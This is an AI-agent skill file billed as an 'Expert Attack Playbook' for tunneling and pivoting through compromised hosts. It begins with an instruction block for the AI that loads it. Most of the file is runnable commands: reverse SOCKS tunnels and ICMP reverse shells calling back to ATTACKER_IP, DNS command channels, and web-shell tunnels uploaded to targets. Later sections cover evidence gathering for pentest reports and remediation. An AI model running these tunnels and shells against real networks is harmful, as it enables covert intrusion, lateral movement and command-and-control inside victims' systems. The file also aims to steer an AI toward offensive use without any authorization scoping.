---
name: tunneling-and-pivoting
description: >-
  Tunneling and pivoting playbook. Use when establishing network tunnels through compromised hosts including SSH tunneling, Chisel, Ligolo-ng, socat, DNS/ICMP/HTTP tunneling, ProxyChains, and multi-layer pivoting strategies.
---

# SKILL: Tunneling & Pivoting — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert tunneling and pivoting techniques. Covers SSH port forwarding (local/remote/dynamic/jump), Chisel reverse SOCKS, Ligolo-ng transparent TUN pivoting, socat relays, DNS/ICMP/HTTP tunneling, ProxyChains configuration, Windows pivoting (netsh/plink), and multi-layer chaining. Base models miss egress-aware tool selection and transparent routing setup.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for network-level attacks from pivot positions
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for establishing initial access shells
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting services discovered through pivots
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after pivoting to new hosts

---

## 1. SSH TUNNELING

### Local Port Forward

Forward a local port to a remote service through the pivot.

```bash
# Access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N

# Access internal web app
ssh -L 8080:10.10.10.100:80 user@PIVOT -N
# Browse: http://localhost:8080

# Bind to all interfaces (share with teammates)
ssh -L 0.0.0.0:8080:INTERNAL:80 user@PIVOT -N
```

### Remote Port Forward

Expose a local service to the pivot host's network.

```bash
# Make attacker's port 8000 accessible on pivot as pivot:9000
ssh -R 9000:127.0.0.1:8000 user@PIVOT -N

# Expose attacker's listener to internal network
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N
# Internal hosts connect to PIVOT:4444 → reaches attacker:4444
```

### Dynamic Port Forward (SOCKS Proxy)

```bash
# Create SOCKS4/5 proxy on localhost:1080
ssh -D 1080 user@PIVOT -N

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24

# Or with browser SOCKS proxy → browse internal web apps
```

### Jump Host (ProxyJump)

```bash
# Single jump
ssh -J jumphost user@TARGET

# Multiple jumps
ssh -J jump1,jump2 user@TARGET

# SSH config for persistent jump
# ~/.ssh/config
Host internal-target
    HostName 10.10.10.100
    User admin
    ProxyJump user@jumphost.example.com
```

---

## 2. CHISEL

### Reverse SOCKS Proxy (Most Common)

```bash
# Attacker: start chisel server
chisel server --reverse --port 8080

# Victim: connect back as client, create reverse SOCKS
chisel client ATTACKER_IP:8080 R:socks

# Result: SOCKS5 proxy on attacker's 127.0.0.1:1080
proxychains nmap -sT -Pn INTERNAL/24
```

### Port Forwarding

```bash
# Forward specific port
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306

# Multiple forwards
chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80

# Reverse port forward (expose attacker service to victim network)
chisel client ATTACKER:8080 R:0.0.0.0:4444:127.0.0.1:4444
```

---

## 3. LIGOLO-NG

TUN interface-based pivoting — transparent routing without SOCKS.

```bash
# Attacker: start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (victim): connect to proxy
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo-proxy console:
>> session                    # select agent session
>> ifconfig                   # view agent's network interfaces
>> start                      # start tunnel

# Add routes on attacker to reach internal networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

### Listener (Reverse Shell Catcher Through Pivot)

```bash
# In ligolo-proxy console:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Internal hosts connecting to AGENT:4444 → forwarded to attacker:4444
```

### Double Pivot

```bash
# Agent 1 on DMZ → tunnel to internal network 1
# Agent 2 on internal network 1 → tunnel to internal network 2
# Add routes for both networks on attacker
sudo ip route add 10.0.0.0/24 dev ligolo    # via agent 1
sudo ip route add 172.16.0.0/24 dev ligolo  # via agent 2
```

---

## 4. SOCAT

```bash
# TCP port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80

# File transfer via socat
# Receiver:
socat TCP-LISTEN:9999,fork file:received_file,create
# Sender:
socat TCP:RECEIVER:9999 file:send_file
```

---

## 5. PROXYCHAINS / PROXIFIER

### ProxyChains Configuration

```ini
# /etc/proxychains4.conf
strict_chain          # fail if any proxy is down
# dynamic_chain       # skip dead proxies
# random_chain        # randomize proxy order

[ProxyList]
socks5 127.0.0.1 1080        # first hop (SSH dynamic forward)
socks5 127.0.0.1 1081        # second hop (if chaining)
```

```bash
# Usage
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p pass
```

---

## 6. WINDOWS PIVOTING

### Netsh Port Forwarding

```cmd
:: Forward port (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP

:: List forwards
netsh interface portproxy show all

:: Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Plink (PuTTY CLI)

```cmd
:: Dynamic SOCKS (like ssh -D)
plink.exe -ssh -D 1080 -N user@ATTACKER

:: Remote port forward
plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER

:: Automated (non-interactive, accept host key)
echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
```

---

## 7. DNS TUNNELING

```bash
# iodine — IP-over-DNS
# Server (attacker, with NS record pointing to attacker):
iodined -f -c -P password 10.0.0.1 t1.yourdomain.com

# Client (victim):
iodine -f -P password t1.yourdomain.com
# Creates dns0 interface → route traffic through it

# dnscat2 — command channel over DNS
# Server:
ruby dnscat2.rb yourdomain.com
# Client:
./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET
```

---

## 8. ICMP TUNNELING

```bash
# icmpsh — ICMP reverse shell (no raw socket on victim needed for Windows)
# Attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP VICTIM_IP

# Victim (Windows):
icmpsh.exe -t ATTACKER_IP

# ptunnel-ng — TCP-over-ICMP
# Server:
ptunnel-ng -r INTERNAL_HOST -R 22
# Client:
ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22
ssh -p 2222 user@127.0.0.1
```

---

## 9. HTTP TUNNELING

```bash
# Neo-reGeorg — SOCKS proxy via web shell
# Generate tunnel web shell:
python3 neoreg.py generate -k PASSWORD

# Upload tunnel.php/aspx/jsp to target web server

# Connect:
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
# SOCKS proxy on 127.0.0.1:1080

# Tunna — HTTP tunnel (alternative)
python2 proxy.py -u http://TARGET/conn.php -l 4444 -r 3389 -a INTERNAL_IP
```

---

## 10. PIVOTING DECISION MATRIX

| Egress Allowed | Tool | Notes |
|---|---|---|
| TCP outbound (any port) | Chisel, Ligolo-ng, SSH | Fastest setup |
| TCP 80/443 only | Chisel (HTTP/S), Neo-reGeorg | Blend with web traffic |
| DNS only (53/udp) | iodine, dnscat2 | Slow but stealthy |
| ICMP only | ptunnel-ng, icmpsh | Very restricted environments |
| No outbound | Bind shell + port forward in | Needs inbound access to pivot |
| Web shell only | Neo-reGeorg, Tunna | When only HTTP file upload works |

---

## 11. DECISION TREE

```
Compromised host — need to reach internal network
│
├── Can install tools on pivot?
│   ├── YES + outbound TCP allowed?
│   │   ├── Need transparent routing? → Ligolo-ng (§3)
│   │   ├── Need SOCKS proxy? → Chisel reverse SOCKS (§2)
│   │   └── SSH available? → SSH dynamic forward (§1)
│   │
│   ├── YES + only HTTP(S) outbound?
│   │   ├── Chisel over HTTPS (§2)
│   │   └── Upload web tunnel → Neo-reGeorg (§9)
│   │
│   ├── YES + only DNS outbound?
│   │   └── iodine or dnscat2 (§7)
│   │
│   └── YES + only ICMP allowed?
│       └── ptunnel-ng or icmpsh (§8)
│
├── Cannot install tools (web shell only)?
│   └── Neo-reGeorg / Tunna via web shell (§9)
│
├── Windows pivot?
│   ├── Admin access? → netsh portproxy (§6)
│   ├── SSH client available? → ssh.exe (Windows 10+) (§1)
│   └── Outbound SSH? → plink (§6)
│
├── Need multi-layer pivot?
│   ├── Ligolo-ng: multiple agents + route stacking (§3)
│   ├── SSH ProxyJump chaining (§1)
│   └── ProxyChains with multiple SOCKS (§5)
│
└── Teammate needs access too?
    ├── Bind SOCKS on 0.0.0.0 (ssh -L 0.0.0.0:...)
    └── Share Ligolo-ng routes via common proxy
```

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did traffic **traverse the pivot** and reach a host the attacker could not reach directly? | the route, not the tool |
| 2 | Was the **direct path demonstrated BLOCKED first**? | the control |
| 3 | Did the pivot's **own logs** record the connection, or did the target's service reply? | the route is real, not local |
| 4 | Was the tunnel **stable for the objective** (idle, throughput, reconnect)? | a tunnel that dies cannot serve it |
| 5 | Is the finding the **segmentation gap**, or the pivot host's **own exposure**? | different remediations |
| 6 | Did it reach the **goal** - a service reached, a file read, a session? | the route is intermediate |
| 7 | What **direction** is the tunnel, and what does that imply for the egress policy? | reverse tunnels invert the control |

**Traffic traversing the pivot to a host the attacker could not otherwise reach, with a blocked direct path
as the control.** A tunnel that is established but carries nothing is not a finding.

---

## 13. EXECUTION PRIMITIVES

A pivoting finding is proven by **a direct path being blocked, the pivot carrying the traffic, and the far
side's own reply arriving through it**. An established tunnel proves nothing about where its far end can
reach, and this is the family's central distinction.

### 12.1 The topology proof, which comes before any tool

```bash
# THE FINDING IS A ROUTE, NOT A TUNNEL. Establish the topology and the blocked control FIRST.
ATTACKER="${ATTACKER_IP:?your own address}"
PIVOT="${PIVOT:?the pivot host}"
TARGET="${TARGET:?the host beyond the pivot}"
echo "=== 1. THE BLOCKED CONTROL: from the attacker, the target must be UNREACHABLE ==="
echo "--- direct attempt, which must FAIL ---"
timeout 5 bash -c "cat < /dev/null > /dev/tcp/$TARGET/{$PORT:-445}" 2>&1 && \
  echo "  UNEXPECTED: the target IS directly reachable -> THERE IS NO PIVOT FINDING, only a direct one." || \
  echo "  blocked as expected -> the control holds"
echo "--- and the routing proof: no route, or a filtered one ---"
ip route get "$TARGET" 2>/dev/null || echo "  no route to $TARGET from here"
echo
echo "=== 2. THE PIVOT'S OWN POSITION, which is what makes the route possible ==="
echo "  from the pivot, the target must be reachable - THAT is the segmentation gap:"
ssh "$PIVOT" "timeout 5 bash -c 'cat < /dev/null > /dev/tcp/$TARGET/${PORT:-445}' && echo REACHABLE || echo unreachable"
echo "  the pair is the finding: blocked from the attacker, reachable from the pivot."
echo
echo "=== 3. THE ROUTE, established through the pivot ==="
cat <<'ROUTES'
  the three shapes, and what each implies for the finding:
    FORWARD  (your traffic -> your proxy -> the pivot -> the target)
             implies: YOU can reach the pivot; the target trusts the pivot's position.
             remediation is the SEGMENTATION between the pivot and the target.
    REVERSE  (the pivot calls you, then you route through the pivot)
             implies: the pivot had EGRESS to you, which is its own finding (see reverse-shell).
             remediation is BOTH the egress policy and the segmentation.
    CHAINED  (multiple pivots)
             each hop is its own finding, and each must be reported separately, since fixing one
             leaves the others.
ROUTES
echo
echo "=== 4. THE TRAVERSAL PROOF: the FAR SIDE must reply ==="
cat <<'PROOF'
  A TUNNEL THAT IS UP IS NOT A ROUTE. The proof is that a thing on the FAR side ANSWERED:
    1. the target's service BANNER or version string, obtained THROUGH the tunnel
    2. the pivot's own connection log showing the forwarded connection
    3. a file's CONTENTS read from a host beyond the pivot
  THE CONTROL: the same request DIRECTLY (from the attacker) must FAIL, and the same request
  WITHOUT the tunnel configured must FAIL. Both, or the route is not proven.
PROOF
```

**Blocked from the attacker, reachable from the pivot — that pair is the finding.** A tunnel that is up is
not a route, and the far side's answer is the proof.

### 12.2 The traversal, and the far side's reply

```bash
echo "=== THE TRAVERSAL, mechanically, with the far side's reply captured ==="
echo "--- the ssh dynamic forward, then the far-side probe through it ---"
ssh -fN -D 1080 "$PIVOT" && echo "  the SOCKS proxy is up on 1080 through the pivot"
proxychains4 -q nmap -sT -Pn -p "${PORT:-445}" "$TARGET" 2>&1 | tail -5
echo "  the OPEN PORT is the far side's answer. A tunnel with no open port proved nothing."
echo
echo "--- the pivot's own log, which is the second, independent proof ---"
ssh "$PIVOT" "sudo ss -tnp 2>/dev/null | grep -E '${PORT:-445}'" 2>/dev/null || \
  echo "  (the pivot's log is the independent proof that the connection came THROUGH it)"
echo
echo "=== THE THREE EVIDENCE LAYERS, and why one is not enough ==="
cat <<'LAYERS'
  1. YOUR SIDE      : the local proxy/tunnel is listening and carrying bytes
  2. THE PIVOT      : ITS log shows a forwarded connection to the target (the ROUTE's proof)
  3. THE FAR SIDE   : the target's service replied with a banner, a file, or a session
  a finding that cites only layer 1 has NOT shown a route. Layers 2 and 3 are what make it one.
  AND THE CONTROL AT EACH LAYER: the direct path must fail, and the tunnel-down path must fail.
LAYERS
echo
echo "=== the tool-independent check, which the report should carry ==="
echo "  record: the pivot's OS and the transport used (ssh, chisel, ligolo, socat), and WHY."
echo "  the WHY is part of the finding, because a pivot chosen for the egress policy's allowance"
echo "  is a different finding from one chosen for convenience."
```

**Layers: your side, the pivot's log, and the far side's reply — a finding citing only the first has not
shown a route.** And the transport choice is part of the finding when the egress policy drove it.

### 12.3 Durability, and the goal

```bash
echo "=== THE DURABILITY, which the objective decides ==="
cat <<'DURABLE'
  MEASURE and report:
    throughput          : a known-size transfer (a chisel tunnel and an ssh -D tunnel differ widely)
    idle survival       : an idle tunnel may be dropped by the pivot's or the target's state tracking
    connection count    : does the tunnel multiplex, or does each connection cost a new one?
    stability under load : parallel connections through the pivot
  THE OBJECTIVE DECIDES THE THRESHOLD: a single port probe needs seconds; a file transfer or an
  interactive session needs stability for minutes, and a scan needs many parallel connections.
  a tunnel that supports the probe but dies under a scan does NOT support the scan finding.

  THE FAILURE MODES:
    dies on idle          -> a NAT/stateful-firewall timeout on the segment (MEASURE its length)
    dies under parallel   -> a connection limit on the pivot or an inspection device
    dies on a large file  -> an MTU issue or an inspection device reassembling badly
    dies after N minutes  -> a session timeout
DURABLE
echo
echo "=== THE GOAL ==="
cat <<'GOAL'
  a tunnel established but nothing reached        -> a CONNECTIVITY finding only
  a service banner obtained from the far side     -> a SEGMENTATION finding
  a file read or written beyond the pivot         -> a DATA-ACCESS finding
  a session on a host beyond the pivot            -> an ACCESS finding
  a second pivot established                      -> a CHAINED finding; report each hop separately
  NAME IT. 'we pivoted' does not state which segment boundary was crossed, and the reader cannot
  remediate a boundary they cannot identify.
GOAL
echo
echo "=== THE SEGMENTATION vs THE PIVOT'S EXPOSURE, which must be separated ==="
cat <<'SEPARATE'
  TWO DIFFERENT FINDINGS ARE FREQUENTLY MERGED HERE, AND THEY HAVE DIFFERENT FIXES:
    A. THE SEGMENTATION GAP: the pivot can reach the far side, and the segmentation policy does
       not permit or does not monitor that path. FIX: the segmentation policy and the inter-zone
       control. The pivot being compromised is a PREREQUISITE, not the misconfiguration.
    B. THE PIVOT'S OWN EXPOSURE: the pivot was compromised because IT was reachable or its
       credentials were weak. FIX: the pivot's hardening.
  THE REPORT MUST SAY WHICH IT IS REPORTING, and usually BOTH, as two findings.
SEPARATE
```

**The segmentation gap and the pivot's own exposure are two findings with different fixes.** Reporting
them merged leaves one of them unaddressed.

### 12.4 The end-to-end harness

```bash
python3 - <<'PY'
print("=== TUNNELING / PIVOTING ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the DIRECT path from the attacker to the target was shown BLOCKED first",
  "without it there is no pivot finding, only a direct one"),
 ("the PIVOT'S reachability of the target was shown - the pair is the segmentation gap",
  "blocked from here and reachable from there"),
 ("the tunnel's DIRECTION is named: forward, reverse, or chained",
  "a reverse tunnel is also an egress finding, and chained hops are separate findings"),
 ("the PIVOT'S OWN LOG shows the forwarded connection",
  "evidence layer 2: the route's proof, independent of your side"),
 ("the FAR SIDE replied: a banner, a file, or a session",
  "evidence layer 3; a tunnel with no far-side answer is not a route"),
 ("BOTH controls were run: the direct path failing, and the tunnel-down path failing",
  "the route must be shown to be the variable"),
 ("the DURABILITY was measured against the objective's needs",
  "a tunnel that supports a probe may not support a scan or a transfer"),
 ("the transport and the REASON for choosing it are recorded",
  "a transport chosen for the egress policy is a different finding from one chosen for convenience"),
 ("the finding is reported EITHER as a segmentation gap OR as the pivot's own exposure",
  "two different remediations, and merging them leaves one unaddressed"),
 ("for a chained pivot, EACH hop is reported separately",
  "fixing one hop leaves the others"),
 ("the GOAL is named: connectivity, segmentation, data access, or access beyond the pivot",
  "'we pivoted' does not identify the boundary that was crossed"),
]
for n, how in CHECKS: print("  [ ] %-72s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  control   : the direct path blocked, and the pivot's reachability")
print("  route     : the direction, the transport, and the reason")
print("  evidence  : your side, the pivot's log, and the far side's reply (all three)")
print("  durability: throughput, idle survival, and behaviour under load")
print("  class     : the segmentation gap, or the pivot's exposure, named separately")
print("  goal      : what was reached beyond the pivot")
PY
```

**Blocked-direct, the pivot's log, the far side's reply, durability, class, goal.** The class line is what
makes the finding remediable.

---

## 14. EVIDENCE STANDARD
| Item | Why |
|---|---|
| The **direct path, demonstrated BLOCKED first** | the control that makes the traversal a finding |
| The **three evidence layers**: your side, the pivot's own log, the far side's reply | any one alone is a routing artefact |
| The **pivot's own record** of the connection, from its log | the pivot attesting that it carried the traffic |
| The **far host's reply** arriving through the tunnel | the destination's own confirmation |
| The **topology**: what may reach what, and which rule was crossed | a tunnel's existence says nothing about its far end's reach |
| The **durability measurement**: idle timeout, throughput, reconnection | a tunnel that dies cannot carry the objective |
| The **egress class**, and whether the segmentation gap and the pivot exposure are separate findings | they are distinct and often merged |

### Traversal failures — how they mislead

| Failure | How it misleads |
|---|---|
| **No blocked-path control** | an open route proves nothing; many hosts were reachable all along |
| **Your-side evidence only** | a local listener's log shows a connection, not a traversal |
| A **tunnel established** read as reachable destinations | establishment and reachability are different questions |
| **Segmentation gap** merged with **pivot exposure** | one is a network policy defect and the other is a host defect |
| **Durability untested** | a tunnel that dies in 30 seconds cannot carry an objective |
| The **pivot's log unchecked** | the strongest single piece of traversal evidence is the pivot's own record |
| An **egress class assumed** | allowed-port, allowed-protocol, open-proxy, and resolver-only are different findings |

| Item | Why |
|---|---|
| The **direct path's refusal**, with its shape (timeout, ICMP unreachable, reset) | the control, and the shape identifies the denying device |
| The **pivot's own log** recording the connection | the pivot attesting it carried the traffic |
| The **far host's reply** arriving through the tunnel | the destination's confirmation, and the only one that proves reachability |
| The **topology** and the specific rule crossed | turns "a tunnel exists" into "the policy was crossed" |
| The **durability measurement**, with its method | an unstable tunnel changes the finding's value |
| The **egress class** named | the class determines what else the channel can carry |
| The **two findings separated**: segmentation gap and pivot exposure | they have different owners and different fixes |

**The direct path blocked first is the control** — and the traversal is proven on three layers, because any
one alone is a routing artefact and a tunnel's existence says nothing about its far end's reach.

---

## 15. REMEDIATION REFERENCE

1. **Name the crossed rule, not the tunnel.** The fix is the segmentation policy, the egress filter, or
   the outbound proxy rule that permitted the traversal - not "block the tool".
2. **Separate the two findings in the remediation.** A segmentation gap is a network-policy fix; a pivot
   host is a host-hardening fix, and they have different owners.
3. **Fix egress first.** Most pivots depend on an outbound channel; allow-listing egress destinations and
   requiring a proxy removes the whole class more effectively than blocking one protocol.
4. **State the residual exposure.** Blocking one protocol leaves others, and a resolver-only egress is
   still an exfiltration path; say what remains.
5. **Require authentication on the far side.** Where the traversal reached a service, the durable fix is
   that service's own authentication, not the network path alone.

---

## 16. RELATED SIBLINGS - LOAD TOGETHER
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) - the channel a reverse pivot depends on
- [infrastructure-network-pentesting](../infrastructure-network-pentesting/SKILL.md) - the segmentation this demonstrates
- [cloudflare-waf-recon-survival](../cloudflare-waf-recon-survival/SKILL.md) - the edge layer a tunnel may have to traverse
- [linux-privesc-gtfobins-master](../linux-privesc-gtfobins-master/SKILL.md) - how the pivot host was usually obtained
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) - the Windows-side movement the same position enables
